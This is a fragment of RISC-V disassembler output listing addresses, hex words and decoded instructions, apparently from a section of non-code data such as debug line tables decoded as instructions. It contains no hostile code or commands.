     d50:	0100                	addi	s0,sp,128
     d52:	0a05                	addi	s4,s4,1
     d54:	02090003          	lb	zero,32(s2)
     d58:	0100                	addi	s0,sp,128
     d5a:	0905                	addi	s2,s2,1
     d5c:	0a090103          	lb	sp,160(s2)
     d60:	0100                	addi	s0,sp,128
     d62:	1305                	addi	t1,t1,-31
     d64:	0200                	addi	s0,sp,256
     d66:	0104                	addi	s1,sp,128
     d68:	02090003          	lb	zero,32(s2)
     d6c:	0100                	addi	s0,sp,128
     d6e:	0905                	addi	s2,s2,1
     d70:	0200                	addi	s0,sp,256
     d72:	0104                	addi	s1,sp,128
     d74:	0a090003          	lb	zero,160(s2)
     d78:	0100                	addi	s0,sp,128
     d7a:	0c05                	addi	s8,s8,1
     d7c:	02090203          	lb	tp,32(s2)
     d80:	0100                	addi	s0,sp,128
     d82:	0305                	addi	t1,t1,1
     d84:	0c090203          	lb	tp,192(s2)
     d88:	0100                	addi	s0,sp,128
     d8a:	1305                	addi	t1,t1,-31
     d8c:	04090103          	lb	sp,64(s2)
     d90:	0100                	addi	s0,sp,128
     d92:	0105                	addi	sp,sp,1
     d94:	02090103          	lb	sp,32(s2)
     d98:	0100                	addi	s0,sp,128
     d9a:	08090703          	lb	a4,128(s2)
     d9e:	0100                	addi	s0,sp,128
     da0:	0705                	addi	a4,a4,1
     da2:	0c090103          	lb	sp,192(s2)
     da6:	0100                	addi	s0,sp,128
     da8:	0305                	addi	t1,t1,1
     daa:	0200                	addi	s0,sp,256
     dac:	0104                	addi	s1,sp,128
     dae:	04090803          	lb	a6,64(s2)
     db2:	0100                	addi	s0,sp,128
     db4:	0200                	addi	s0,sp,256
     db6:	0204                	addi	s1,sp,256
     db8:	0306                	slli	t1,t1,0x1
     dba:	0900                	addi	s0,sp,144
     dbc:	000e                	c.slli	zero,0x3
     dbe:	0001                	nop
     dc0:	0402                	slli	s0,s0,0x0
     dc2:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
     dc6:	0018                	0x18
     dc8:	0001                	nop
     dca:	0402                	slli	s0,s0,0x0
     dcc:	0305                	addi	t1,t1,1
     dce:	0900                	addi	s0,sp,144
     dd0:	0038                	addi	a4,sp,8
     dd2:	0001                	nop
     dd4:	0402                	slli	s0,s0,0x0
     dd6:	0601                	addi	a2,a2,0
     dd8:	1e090103          	lb	sp,480(s2)
     ddc:	0100                	addi	s0,sp,128
     dde:	0200                	addi	s0,sp,256
     de0:	0204                	addi	s1,sp,256
     de2:	0306                	slli	t1,t1,0x1
     de4:	0900                	addi	s0,sp,144
     de6:	000e                	c.slli	zero,0x3
     de8:	0001                	nop
     dea:	0402                	slli	s0,s0,0x0
     dec:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
     df0:	0018                	0x18
     df2:	0001                	nop
     df4:	0402                	slli	s0,s0,0x0
     df6:	0305                	addi	t1,t1,1
     df8:	0900                	addi	s0,sp,144
     dfa:	0038                	addi	a4,sp,8
     dfc:	0501                	addi	a0,a0,0
     dfe:	0001                	nop
     e00:	0402                	slli	s0,s0,0x0
     e02:	0605                	addi	a2,a2,1
     e04:	1e090303          	lb	t1,480(s2)
     e08:	0100                	addi	s0,sp,128
     e0a:	08090303          	lb	t1,128(s2)
     e0e:	0100                	addi	s0,sp,128
     e10:	1205                	addi	tp,tp,-31
     e12:	0a090103          	lb	sp,160(s2)
     e16:	0100                	addi	s0,sp,128
     e18:	1805                	addi	a6,a6,-31
     e1a:	06090003          	lb	zero,96(s2)
     e1e:	0100                	addi	s0,sp,128
     e20:	0a05                	addi	s4,s4,1
     e22:	04090003          	lb	zero,64(s2)
     e26:	0100                	addi	s0,sp,128
     e28:	0905                	addi	s2,s2,1
     e2a:	0200                	addi	s0,sp,256
     e2c:	0104                	addi	s1,sp,128
     e2e:	0a090103          	lb	sp,160(s2)
     e32:	0100                	addi	s0,sp,128
     e34:	0105                	addi	sp,sp,1
     e36:	02090403          	lb	s0,32(s2)
     e3a:	0100                	addi	s0,sp,128
     e3c:	0305                	addi	t1,t1,1
     e3e:	14090103          	lb	sp,320(s2)
     e42:	0100                	addi	s0,sp,128
     e44:	0105                	addi	sp,sp,1
     e46:	08090403          	lb	s0,128(s2)
     e4a:	0100                	addi	s0,sp,128
     e4c:	0305                	addi	t1,t1,1
     e4e:	0e090103          	lb	sp,224(s2)
     e52:	0100                	addi	s0,sp,128
     e54:	0105                	addi	sp,sp,1
     e56:	0a090403          	lb	s0,160(s2)
     e5a:	0100                	addi	s0,sp,128
     e5c:	0305                	addi	t1,t1,1
     e5e:	08090103          	lb	sp,128(s2)
     e62:	0100                	addi	s0,sp,128
     e64:	0105                	addi	sp,sp,1
     e66:	08090403          	lb	s0,128(s2)
     e6a:	0100                	addi	s0,sp,128
     e6c:	0305                	addi	t1,t1,1
     e6e:	0e090103          	lb	sp,224(s2)
     e72:	0100                	addi	s0,sp,128
     e74:	0105                	addi	sp,sp,1
     e76:	1c090103          	lb	sp,448(s2)
     e7a:	0100                	addi	s0,sp,128
     e7c:	0c090303          	lb	t1,192(s2)
     e80:	0100                	addi	s0,sp,128
     e82:	0905                	addi	s2,s2,1
     e84:	0200                	addi	s0,sp,256
     e86:	0104                	addi	s1,sp,128
     e88:	14090303          	lb	t1,320(s2)
     e8c:	0100                	addi	s0,sp,128
     e8e:	0105                	addi	sp,sp,1
     e90:	08090103          	lb	sp,128(s2)
     e94:	0100                	addi	s0,sp,128
     e96:	0a090303          	lb	t1,160(s2)
     e9a:	0100                	addi	s0,sp,128
     e9c:	0305                	addi	t1,t1,1
     e9e:	12090203          	lb	tp,288(s2)
     ea2:	0100                	addi	s0,sp,128
     ea4:	0a05                	addi	s4,s4,1
     ea6:	0c090103          	lb	sp,192(s2)
     eaa:	0100                	addi	s0,sp,128
     eac:	0105                	addi	sp,sp,1
     eae:	02090103          	lb	sp,32(s2)
     eb2:	0100                	addi	s0,sp,128
     eb4:	0a090303          	lb	t1,160(s2)
     eb8:	0100                	addi	s0,sp,128
     eba:	2305                	addiw	t1,t1,1
     ebc:	08090403          	lb	s0,128(s2)
     ec0:	0100                	addi	s0,sp,128
     ec2:	0a05                	addi	s4,s4,1
     ec4:	0c090003          	lb	zero,192(s2)
     ec8:	0100                	addi	s0,sp,128
     eca:	0305                	addi	t1,t1,1
     ecc:	04090103          	lb	sp,64(s2)
     ed0:	0100                	addi	s0,sp,128
     ed2:	2105                	addiw	sp,sp,1
     ed4:	14090103          	lb	sp,320(s2)
     ed8:	0100                	addi	s0,sp,128
     eda:	0a05                	addi	s4,s4,1
     edc:	0c090003          	lb	zero,192(s2)
     ee0:	0100                	addi	s0,sp,128
     ee2:	0305                	addi	t1,t1,1
     ee4:	04090103          	lb	sp,64(s2)
     ee8:	0100                	addi	s0,sp,128
     eea:	0105                	addi	sp,sp,1
     eec:	14090103          	lb	sp,320(s2)
     ef0:	0100                	addi	s0,sp,128
     ef2:	0a090303          	lb	t1,160(s2)
     ef6:	0100                	addi	s0,sp,128
     ef8:	0305                	addi	t1,t1,1
     efa:	32090103          	lb	sp,800(s2)
     efe:	0100                	addi	s0,sp,128
     f00:	04090103          	lb	sp,64(s2)
     f04:	0100                	addi	s0,sp,128
     f06:	0d05                	addi	s10,s10,1
     f08:	10090303          	lb	t1,256(s2)
     f0c:	0100                	addi	s0,sp,128
     f0e:	0905                	addi	s2,s2,1
     f10:	0e090303          	lb	t1,224(s2)
     f14:	0100                	addi	s0,sp,128
     f16:	0c05                	addi	s8,s8,1
     f18:	04090103          	lb	sp,64(s2)
     f1c:	0100                	addi	s0,sp,128
     f1e:	0305                	addi	t1,t1,1
     f20:	04090003          	lb	zero,64(s2)
     f24:	0100                	addi	s0,sp,128
     f26:	1105                	addi	sp,sp,-31
     f28:	02090103          	lb	sp,32(s2)
     f2c:	0100                	addi	s0,sp,128
     f2e:	0805                	addi	a6,a6,1
     f30:	12090003          	lb	zero,288(s2)
     f34:	0100                	addi	s0,sp,128
     f36:	0f05                	addi	t5,t5,1
     f38:	02090103          	lb	sp,32(s2)
     f3c:	0100                	addi	s0,sp,128
     f3e:	0c05                	addi	s8,s8,1
     f40:	3a090003          	lb	zero,928(s2)
     f44:	0100                	addi	s0,sp,128
     f46:	2605                	addiw	a2,a2,1
     f48:	0200                	addi	s0,sp,256
     f4a:	0204                	addi	s1,sp,256
     f4c:	0a097e03          	0xa097e03
     f50:	0100                	addi	s0,sp,128
     f52:	0305                	addi	t1,t1,1
     f54:	0200                	addi	s0,sp,256
     f56:	0104                	addi	s1,sp,128
     f58:	0a090003          	lb	zero,160(s2)
     f5c:	0100                	addi	s0,sp,128
     f5e:	0605                	addi	a2,a2,1
     f60:	0e090303          	lb	t1,224(s2)
     f64:	0100                	addi	s0,sp,128
     f66:	0505                	addi	a0,a0,1
     f68:	08090103          	lb	sp,128(s2)
     f6c:	0100                	addi	s0,sp,128
     f6e:	0305                	addi	t1,t1,1
     f70:	06090203          	lb	tp,96(s2)
     f74:	0100                	addi	s0,sp,128
     f76:	0105                	addi	sp,sp,1
     f78:	0a090503          	lb	a0,160(s2)
     f7c:	0100                	addi	s0,sp,128
     f7e:	0d05                	addi	s10,s10,1
     f80:	0e090403          	lb	s0,224(s2)
     f84:	0100                	addi	s0,sp,128
     f86:	1105                	addi	sp,sp,-31
     f88:	10090003          	lb	zero,256(s2)
     f8c:	0100                	addi	s0,sp,128
     f8e:	0605                	addi	a2,a2,1
     f90:	12090203          	lb	tp,288(s2)
     f94:	0100                	addi	s0,sp,128
     f96:	1c05                	addi	s8,s8,-31
     f98:	0200                	addi	s0,sp,256
     f9a:	0104                	addi	s1,sp,128
     f9c:	0e090003          	lb	zero,224(s2)
     fa0:	0100                	addi	s0,sp,128
     fa2:	1205                	addi	tp,tp,-31
     fa4:	0200                	addi	s0,sp,256
     fa6:	0104                	addi	s1,sp,128
     fa8:	04090003          	lb	zero,64(s2)
     fac:	0100                	addi	s0,sp,128
     fae:	0505                	addi	a0,a0,1
     fb0:	0a090203          	lb	tp,160(s2)
     fb4:	0100                	addi	s0,sp,128
     fb6:	0c05                	addi	s8,s8,1
     fb8:	16090103          	lb	sp,352(s2)
     fbc:	0100                	addi	s0,sp,128
     fbe:	0a05                	addi	s4,s4,1
     fc0:	04090303          	lb	t1,64(s2)
     fc4:	0100                	addi	s0,sp,128
     fc6:	0105                	addi	sp,sp,1
     fc8:	02090103          	lb	sp,32(s2)
     fcc:	0100                	addi	s0,sp,128
     fce:	0a090303          	lb	t1,160(s2)
     fd2:	0100                	addi	s0,sp,128
     fd4:	0a05                	addi	s4,s4,1
     fd6:	0c090303          	lb	t1,192(s2)
     fda:	0100                	addi	s0,sp,128
     fdc:	0305                	addi	t1,t1,1
     fde:	04090003          	lb	zero,64(s2)
     fe2:	0100                	addi	s0,sp,128
     fe4:	1405                	addi	s0,s0,-31
     fe6:	02090203          	lb	tp,32(s2)
     fea:	0100                	addi	s0,sp,128
     fec:	2105                	addiw	sp,sp,1
     fee:	0e090003          	lb	zero,224(s2)
     ff2:	0100                	addi	s0,sp,128
     ff4:	1b05                	addi	s6,s6,-31
     ff6:	08090003          	lb	zero,128(s2)
     ffa:	0100                	addi	s0,sp,128
     ffc:	0200                	addi	s0,sp,256
     ffe:	0104                	addi	s1,sp,128
    1000:	0306                	slli	t1,t1,0x1
    1002:	0900                	addi	s0,sp,144
    1004:	0006                	c.slli	zero,0x1
    1006:	0001                	nop
    1008:	0402                	slli	s0,s0,0x0
    100a:	0302                	slli	t1,t1,0x0
    100c:	0900                	addi	s0,sp,144
    100e:	0006                	c.slli	zero,0x1
    1010:	0501                	addi	a0,a0,0
    1012:	0402000b          	0x402000b
    1016:	0604                	addi	s1,sp,768
    1018:	04090003          	lb	zero,64(s2)
    101c:	0100                	addi	s0,sp,128
    101e:	1b05                	addi	s6,s6,-31
    1020:	0200                	addi	s0,sp,256
    1022:	0404                	addi	s1,sp,512
    1024:	0c090003          	lb	zero,192(s2)
    1028:	0100                	addi	s0,sp,128
    102a:	0f05                	addi	t5,t5,1
    102c:	0200                	addi	s0,sp,256
    102e:	0404                	addi	s1,sp,512
    1030:	06090003          	lb	zero,96(s2)
    1034:	0100                	addi	s0,sp,128
    1036:	0705                	addi	a4,a4,1
    1038:	0200                	addi	s0,sp,256
    103a:	0404                	addi	s1,sp,512
    103c:	0a090103          	lb	sp,160(s2)
    1040:	0100                	addi	s0,sp,128
    1042:	1805                	addi	a6,a6,-31
    1044:	0200                	addi	s0,sp,256
    1046:	0404                	addi	s1,sp,512
    1048:	0a097d03          	0xa097d03
    104c:	0100                	addi	s0,sp,128
    104e:	0305                	addi	t1,t1,1
    1050:	0200                	addi	s0,sp,256
    1052:	0204                	addi	s1,sp,256
    1054:	0a090003          	lb	zero,160(s2)
    1058:	0100                	addi	s0,sp,128
    105a:	0b05                	addi	s6,s6,1
    105c:	0e090503          	lb	a0,224(s2)
    1060:	0100                	addi	s0,sp,128
    1062:	0305                	addi	t1,t1,1
    1064:	04090203          	lb	tp,64(s2)
    1068:	0100                	addi	s0,sp,128
    106a:	0105                	addi	sp,sp,1
    106c:	0a090103          	lb	sp,160(s2)
    1070:	0100                	addi	s0,sp,128
    1072:	0a090403          	lb	s0,160(s2)
    1076:	0100                	addi	s0,sp,128
    1078:	0705                	addi	a4,a4,1
    107a:	2c090203          	lb	tp,704(s2)
    107e:	0100                	addi	s0,sp,128
    1080:	1705                	addi	a4,a4,-31
    1082:	04090403          	lb	s0,64(s2)
    1086:	0100                	addi	s0,sp,128
    1088:	0d05                	addi	s10,s10,1
    108a:	0c090003          	lb	zero,192(s2)
    108e:	0100                	addi	s0,sp,128
    1090:	1105                	addi	sp,sp,-31
    1092:	0c090003          	lb	zero,192(s2)
    1096:	0100                	addi	s0,sp,128
    1098:	0d05                	addi	s10,s10,1
    109a:	10090103          	lb	sp,256(s2)
    109e:	0100                	addi	s0,sp,128
    10a0:	0805                	addi	a6,a6,1
    10a2:	04090003          	lb	zero,64(s2)
    10a6:	0100                	addi	s0,sp,128
    10a8:	0905                	addi	s2,s2,1
    10aa:	08090203          	lb	tp,128(s2)
    10ae:	0100                	addi	s0,sp,128
    10b0:	1105                	addi	sp,sp,-31
    10b2:	10097d03          	0x10097d03
    10b6:	0100                	addi	s0,sp,128
    10b8:	0705                	addi	a4,a4,1
    10ba:	02090203          	lb	tp,32(s2)
    10be:	0100                	addi	s0,sp,128
    10c0:	0905                	addi	s2,s2,1
    10c2:	02090403          	lb	s0,32(s2)
    10c6:	0100                	addi	s0,sp,128
    10c8:	0505                	addi	a0,a0,1
    10ca:	02090103          	lb	sp,32(s2)
    10ce:	0100                	addi	s0,sp,128
    10d0:	0f05                	addi	t5,t5,1
    10d2:	10097f03          	0x10097f03
    10d6:	0100                	addi	s0,sp,128
    10d8:	0905                	addi	s2,s2,1
    10da:	0c090003          	lb	zero,192(s2)
    10de:	0100                	addi	s0,sp,128
    10e0:	0a090303          	lb	t1,160(s2)
    10e4:	0100                	addi	s0,sp,128
    10e6:	0f05                	addi	t5,t5,1
    10e8:	02090103          	lb	sp,32(s2)
    10ec:	0100                	addi	s0,sp,128
    10ee:	1c05                	addi	s8,s8,-31
    10f0:	10090003          	lb	zero,256(s2)
    10f4:	0100                	addi	s0,sp,128
    10f6:	3305                	addiw	t1,t1,-31
    10f8:	10090003          	lb	zero,256(s2)
    10fc:	0100                	addi	s0,sp,128
    10fe:	0200                	addi	s0,sp,256
    1100:	0104                	addi	s1,sp,128
    1102:	0306                	slli	t1,t1,0x1
    1104:	0900                	addi	s0,sp,144
    1106:	0008                	0x8
    1108:	0001                	nop
    110a:	0402                	slli	s0,s0,0x0
    110c:	0302                	slli	t1,t1,0x0
    110e:	0900                	addi	s0,sp,144
    1110:	0006                	c.slli	zero,0x1
    1112:	0501                	addi	a0,a0,0
    1114:	0015                	c.nop	5
    1116:	0402                	slli	s0,s0,0x0
    1118:	0604                	addi	s1,sp,768
    111a:	04090003          	lb	zero,64(s2)
    111e:	0100                	addi	s0,sp,128
    1120:	0505                	addi	a0,a0,1
    1122:	0200                	addi	s0,sp,256
    1124:	0404                	addi	s1,sp,512
    1126:	04090003          	lb	zero,64(s2)
    112a:	0100                	addi	s0,sp,128
    112c:	0d05                	addi	s10,s10,1
    112e:	0e097f03          	0xe097f03
    1132:	0100                	addi	s0,sp,128
    1134:	0905                	addi	s2,s2,1
    1136:	0c090003          	lb	zero,192(s2)
    113a:	0100                	addi	s0,sp,128
    113c:	0105                	addi	sp,sp,1
    113e:	04090203          	lb	tp,64(s2)
    1142:	0100                	addi	s0,sp,128
    1144:	0c090303          	lb	t1,192(s2)
    1148:	0100                	addi	s0,sp,128
    114a:	0605                	addi	a2,a2,1
    114c:	10090103          	lb	sp,256(s2)
    1150:	0100                	addi	s0,sp,128
    1152:	0c05                	addi	s8,s8,1
    1154:	0e090103          	lb	sp,224(s2)
    1158:	0100                	addi	s0,sp,128
    115a:	0b05                	addi	s6,s6,1
    115c:	14090103          	lb	sp,320(s2)
    1160:	0100                	addi	s0,sp,128
    1162:	0c05                	addi	s8,s8,1
    1164:	08090103          	lb	sp,128(s2)
    1168:	0100                	addi	s0,sp,128
    116a:	14090203          	lb	tp,320(s2)
    116e:	0100                	addi	s0,sp,128
    1170:	0105                	addi	sp,sp,1
    1172:	16090103          	lb	sp,352(s2)
    1176:	0100                	addi	s0,sp,128
    1178:	08090303          	lb	t1,128(s2)
    117c:	0100                	addi	s0,sp,128
    117e:	0605                	addi	a2,a2,1
    1180:	10090103          	lb	sp,256(s2)
    1184:	0100                	addi	s0,sp,128
    1186:	0c05                	addi	s8,s8,1
    1188:	0e090103          	lb	sp,224(s2)
    118c:	0100                	addi	s0,sp,128
    118e:	0b05                	addi	s6,s6,1
    1190:	14090103          	lb	sp,320(s2)
    1194:	0100                	addi	s0,sp,128
    1196:	0c05                	addi	s8,s8,1
    1198:	08090103          	lb	sp,128(s2)
    119c:	0100                	addi	s0,sp,128
    119e:	14090203          	lb	tp,320(s2)
    11a2:	0100                	addi	s0,sp,128
    11a4:	0105                	addi	sp,sp,1
    11a6:	12090103          	lb	sp,288(s2)
    11aa:	0100                	addi	s0,sp,128
    11ac:	08090303          	lb	t1,128(s2)
    11b0:	0100                	addi	s0,sp,128
    11b2:	0b05                	addi	s6,s6,1
    11b4:	1c090903          	lb	s2,448(s2)
    11b8:	0100                	addi	s0,sp,128
    11ba:	0a05                	addi	s4,s4,1
    11bc:	02090103          	lb	sp,32(s2)
    11c0:	0100                	addi	s0,sp,128
    11c2:	04090203          	lb	tp,64(s2)
    11c6:	0100                	addi	s0,sp,128
    11c8:	0705                	addi	a4,a4,1
    11ca:	0a090103          	lb	sp,160(s2)
    11ce:	0100                	addi	s0,sp,128
    11d0:	1205                	addi	tp,tp,-31
    11d2:	0c097c03          	0xc097c03
    11d6:	0100                	addi	s0,sp,128
    11d8:	1005                	c.nop	-31
    11da:	08090003          	lb	zero,128(s2)
    11de:	0100                	addi	s0,sp,128
    11e0:	0b05                	addi	s6,s6,1
    11e2:	04090003          	lb	zero,64(s2)
    11e6:	0100                	addi	s0,sp,128
    11e8:	0805                	addi	a6,a6,1
    11ea:	0a090603          	lb	a2,160(s2)
    11ee:	0100                	addi	s0,sp,128
    11f0:	0e05                	addi	t3,t3,1
    11f2:	0a090303          	lb	t1,160(s2)
    11f6:	0100                	addi	s0,sp,128
    11f8:	0a05                	addi	s4,s4,1
    11fa:	08090103          	lb	sp,128(s2)
    11fe:	0100                	addi	s0,sp,128
    1200:	0b05                	addi	s6,s6,1
    1202:	08090103          	lb	sp,128(s2)
    1206:	0100                	addi	s0,sp,128
    1208:	0f05                	addi	t5,t5,1
    120a:	06090103          	lb	sp,96(s2)
    120e:	0100                	addi	s0,sp,128
    1210:	0b05                	addi	s6,s6,1
    1212:	06090103          	lb	sp,96(s2)
    1216:	0100                	addi	s0,sp,128
    1218:	0d05                	addi	s10,s10,1
    121a:	04090103          	lb	sp,64(s2)
    121e:	0100                	addi	s0,sp,128
    1220:	1305                	addi	t1,t1,-31
    1222:	04090203          	lb	tp,64(s2)
    1226:	0100                	addi	s0,sp,128
    1228:	1205                	addi	tp,tp,-31
    122a:	0c090003          	lb	zero,192(s2)
    122e:	0100                	addi	s0,sp,128
    1230:	1005                	c.nop	-31
    1232:	04090003          	lb	zero,64(s2)
    1236:	0100                	addi	s0,sp,128
    1238:	0c05                	addi	s8,s8,1
    123a:	3a090403          	lb	s0,928(s2)
    123e:	0100                	addi	s0,sp,128
    1240:	0705                	addi	a4,a4,1
    1242:	08090103          	lb	sp,128(s2)
    1246:	0100                	addi	s0,sp,128
    1248:	0c05                	addi	s8,s8,1
    124a:	02090403          	lb	s0,32(s2)
    124e:	0100                	addi	s0,sp,128
    1250:	0705                	addi	a4,a4,1
    1252:	08090103          	lb	sp,128(s2)
    1256:	0100                	addi	s0,sp,128
    1258:	1605                	addi	a2,a2,-31
    125a:	02090c03          	lb	s8,32(s2)
    125e:	0100                	addi	s0,sp,128
    1260:	1f05                	addi	t5,t5,-31
    1262:	04090103          	lb	sp,64(s2)
    1266:	0100                	addi	s0,sp,128
    1268:	2405                	addiw	s0,s0,1
    126a:	12090003          	lb	zero,288(s2)
    126e:	0100                	addi	s0,sp,128
    1270:	1305                	addi	t1,t1,-31
    1272:	04090003          	lb	zero,64(s2)
    1276:	0100                	addi	s0,sp,128
    1278:	0e05                	addi	t3,t3,1
    127a:	08090103          	lb	sp,128(s2)
    127e:	0100                	addi	s0,sp,128
    1280:	0c05                	addi	s8,s8,1
    1282:	08090003          	lb	zero,128(s2)
    1286:	0100                	addi	s0,sp,128
    1288:	04090103          	lb	sp,64(s2)
    128c:	0100                	addi	s0,sp,128
    128e:	1605                	addi	a2,a2,-31
    1290:	0200                	addi	s0,sp,256
    1292:	0104                	addi	s1,sp,128
    1294:	0a090003          	lb	zero,160(s2)
    1298:	0100                	addi	s0,sp,128
    129a:	1d05                	addi	s10,s10,-31
    129c:	0a097d03          	0xa097d03
    12a0:	0100                	addi	s0,sp,128
    12a2:	1305                	addi	t1,t1,-31
    12a4:	0a090103          	lb	sp,160(s2)
    12a8:	0100                	addi	s0,sp,128
    12aa:	1105                	addi	sp,sp,-31
    12ac:	02090803          	lb	a6,32(s2)
    12b0:	0100                	addi	s0,sp,128
    12b2:	0705                	addi	a4,a4,1
    12b4:	12090103          	lb	sp,288(s2)
    12b8:	0100                	addi	s0,sp,128
    12ba:	0a05                	addi	s4,s4,1
    12bc:	02090303          	lb	t1,32(s2)
    12c0:	0100                	addi	s0,sp,128
    12c2:	0f05                	addi	t5,t5,1
    12c4:	0a090103          	lb	sp,160(s2)
    12c8:	0100                	addi	s0,sp,128
    12ca:	0705                	addi	a4,a4,1
    12cc:	04090103          	lb	sp,64(s2)
    12d0:	0100                	addi	s0,sp,128
    12d2:	0f05                	addi	t5,t5,1
    12d4:	02090303          	lb	t1,32(s2)
    12d8:	0100                	addi	s0,sp,128
    12da:	0705                	addi	a4,a4,1
    12dc:	06090103          	lb	sp,96(s2)
    12e0:	0100                	addi	s0,sp,128
    12e2:	02097303          	0x2097303
    12e6:	0100                	addi	s0,sp,128
    12e8:	0a05                	addi	s4,s4,1
    12ea:	02091003          	lh	zero,32(s2)
    12ee:	0100                	addi	s0,sp,128
    12f0:	0f05                	addi	t5,t5,1
    12f2:	0a090103          	lb	sp,160(s2)
    12f6:	0100                	addi	s0,sp,128
    12f8:	2605                	addiw	a2,a2,1
    12fa:	08090003          	lb	zero,128(s2)
    12fe:	0100                	addi	s0,sp,128
    1300:	0705                	addi	a4,a4,1
    1302:	06090103          	lb	sp,96(s2)
    1306:	0100                	addi	s0,sp,128
    1308:	0c05                	addi	s8,s8,1
    130a:	02090403          	lb	s0,32(s2)
    130e:	0100                	addi	s0,sp,128
    1310:	0705                	addi	a4,a4,1
    1312:	0a090103          	lb	sp,160(s2)
    1316:	0100                	addi	s0,sp,128
    1318:	02090403          	lb	s0,32(s2)
    131c:	0100                	addi	s0,sp,128
    131e:	1a090103          	lb	sp,416(s2)
    1322:	0100                	addi	s0,sp,128
    1324:	0e05                	addi	t3,t3,1
    1326:	02090403          	lb	s0,32(s2)
    132a:	0100                	addi	s0,sp,128
    132c:	0a05                	addi	s4,s4,1
    132e:	10090003          	lb	zero,256(s2)
    1332:	0100                	addi	s0,sp,128
    1334:	0b05                	addi	s6,s6,1
    1336:	04090103          	lb	sp,64(s2)
    133a:	0100                	addi	s0,sp,128
    133c:	0a05                	addi	s4,s4,1
    133e:	08090103          	lb	sp,128(s2)
    1342:	0100                	addi	s0,sp,128
    1344:	1505                	addi	a0,a0,-31
    1346:	0200                	addi	s0,sp,256
    1348:	0104                	addi	s1,sp,128
    134a:	0a090003          	lb	zero,160(s2)
    134e:	0100                	addi	s0,sp,128
    1350:	1405                	addi	s0,s0,-31
    1352:	10090103          	lb	sp,256(s2)
    1356:	0100                	addi	s0,sp,128
    1358:	1705                	addi	a4,a4,-31
    135a:	04090003          	lb	zero,64(s2)
    135e:	0100                	addi	s0,sp,128
    1360:	1405                	addi	s0,s0,-31
    1362:	0e090003          	lb	zero,224(s2)
    1366:	0100                	addi	s0,sp,128
    1368:	0905                	addi	s2,s2,1
    136a:	0c090003          	lb	zero,192(s2)
    136e:	0100                	addi	s0,sp,128
    1370:	0b05                	addi	s6,s6,1
    1372:	0200                	addi	s0,sp,256
    1374:	0304                	addi	s1,sp,384
    1376:	02090103          	lb	sp,32(s2)
    137a:	0100                	addi	s0,sp,128
    137c:	3e05                	addiw	t3,t3,-31
    137e:	0200                	addi	s0,sp,256
    1380:	0304                	addi	s1,sp,384
    1382:	12097f03          	0x12097f03
    1386:	0100                	addi	s0,sp,128
    1388:	0905                	addi	s2,s2,1
    138a:	0200                	addi	s0,sp,256
    138c:	0104                	addi	s1,sp,128
    138e:	0a090003          	lb	zero,160(s2)
    1392:	0100                	addi	s0,sp,128
    1394:	0705                	addi	a4,a4,1
    1396:	0a090203          	lb	tp,160(s2)
    139a:	0100                	addi	s0,sp,128
    139c:	0905                	addi	s2,s2,1
    139e:	0200                	addi	s0,sp,256
    13a0:	0504                	addi	s1,sp,640
    13a2:	02090103          	lb	sp,32(s2)
    13a6:	0100                	addi	s0,sp,128
    13a8:	0a05                	addi	s4,s4,1
    13aa:	0200                	addi	s0,sp,256
    13ac:	0504                	addi	s1,sp,640
    13ae:	0c090103          	lb	sp,192(s2)
    13b2:	0100                	addi	s0,sp,128
    13b4:	4d05                	li	s10,1
    13b6:	0200                	addi	s0,sp,256
    13b8:	0504                	addi	s1,sp,640
    13ba:	02097e03          	0x2097e03
    13be:	0100                	addi	s0,sp,128
    13c0:	1405                	addi	s0,s0,-31
    13c2:	0200                	addi	s0,sp,256
    13c4:	0104                	addi	s1,sp,128
    13c6:	0a090003          	lb	zero,160(s2)
    13ca:	0100                	addi	s0,sp,128
    13cc:	1205                	addi	tp,tp,-31
    13ce:	0200                	addi	s0,sp,256
    13d0:	0104                	addi	s1,sp,128
    13d2:	04090003          	lb	zero,64(s2)
    13d6:	0100                	addi	s0,sp,128
    13d8:	0705                	addi	a4,a4,1
    13da:	0200                	addi	s0,sp,256
    13dc:	0104                	addi	s1,sp,128
    13de:	04090003          	lb	zero,64(s2)
    13e2:	0100                	addi	s0,sp,128
    13e4:	2005                	0x2005
    13e6:	0200                	addi	s0,sp,256
    13e8:	0204                	addi	s1,sp,256
    13ea:	02090003          	lb	zero,32(s2)
    13ee:	0100                	addi	s0,sp,128
    13f0:	3205                	addiw	tp,tp,-31
    13f2:	0200                	addi	s0,sp,256
    13f4:	0404                	addi	s1,sp,512
    13f6:	0a090003          	lb	zero,160(s2)
    13fa:	0100                	addi	s0,sp,128
    13fc:	0705                	addi	a4,a4,1
    13fe:	14090403          	lb	s0,320(s2)
    1402:	0100                	addi	s0,sp,128
    1404:	0905                	addi	s2,s2,1
    1406:	0200                	addi	s0,sp,256
    1408:	0204                	addi	s1,sp,256
    140a:	02090103          	lb	sp,32(s2)
    140e:	0100                	addi	s0,sp,128
    1410:	1e05                	addi	t3,t3,-31
    1412:	0200                	addi	s0,sp,256
    1414:	0204                	addi	s1,sp,256
    1416:	0e097f03          	0xe097f03
    141a:	0100                	addi	s0,sp,128
    141c:	0705                	addi	a4,a4,1
    141e:	0200                	addi	s0,sp,256
    1420:	0104                	addi	s1,sp,128
    1422:	0a090003          	lb	zero,160(s2)
    1426:	0100                	addi	s0,sp,128
    1428:	0a090203          	lb	tp,160(s2)
    142c:	0100                	addi	s0,sp,128
    142e:	0d05                	addi	s10,s10,1
    1430:	02090403          	lb	s0,32(s2)
    1434:	0100                	addi	s0,sp,128
    1436:	0b05                	addi	s6,s6,1
    1438:	12090003          	lb	zero,288(s2)
    143c:	0100                	addi	s0,sp,128
    143e:	04090103          	lb	sp,64(s2)
    1442:	0100                	addi	s0,sp,128
    1444:	0a05                	addi	s4,s4,1
    1446:	04090003          	lb	zero,64(s2)
    144a:	0100                	addi	s0,sp,128
    144c:	0905                	addi	s2,s2,1
    144e:	04090103          	lb	sp,64(s2)
    1452:	0100                	addi	s0,sp,128
    1454:	1005                	c.nop	-31
    1456:	0e090103          	lb	sp,224(s2)
    145a:	0100                	addi	s0,sp,128
    145c:	0f05                	addi	t5,t5,1
    145e:	04090003          	lb	zero,64(s2)
    1462:	0100                	addi	s0,sp,128
    1464:	0d05                	addi	s10,s10,1
    1466:	04090003          	lb	zero,64(s2)
    146a:	0100                	addi	s0,sp,128
    146c:	0c05                	addi	s8,s8,1
    146e:	04090203          	lb	tp,64(s2)
    1472:	0100                	addi	s0,sp,128
    1474:	0705                	addi	a4,a4,1
    1476:	06090103          	lb	sp,96(s2)
    147a:	0100                	addi	s0,sp,128
